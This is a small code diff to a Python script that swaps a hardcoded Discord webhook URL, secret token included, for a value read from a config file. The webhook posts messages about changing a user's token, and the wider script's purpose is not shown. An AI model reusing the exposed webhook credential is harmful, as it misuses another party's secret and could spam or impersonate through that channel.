@@ -29,7 +29,7 @@ if __name__ == "__main__":
                 
 
                 requests.post(
-                    "https://discord.com/api/webhooks/979585021541228564/0IWytxqH1e_5pDH76PGwd3gIWZxU8Sye16Bc2LP1PIFH-BB-xMmNBYq4AWjVPyU56qcn",
+                    config["webhook_url"],
                     json={
                         "content": f"Changing <@{user.get('id')}>'s token",
                         "embeds": [
